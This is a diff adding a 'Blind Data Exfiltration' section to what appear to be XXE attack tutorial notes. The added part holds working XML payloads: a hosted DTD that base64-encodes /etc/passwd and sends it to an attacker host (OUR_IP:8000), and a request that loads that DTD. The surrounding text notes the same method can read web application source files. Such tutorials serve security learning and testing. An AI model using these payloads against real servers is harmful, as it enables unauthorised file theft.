@@ -88,3 +88,24 @@ First, we will host a DTD file that contains the following payload:
 
 This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
 
+# Blind Data Exfiltration
+
+First, we will host a DTD file that contains the following payload:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+
+
+
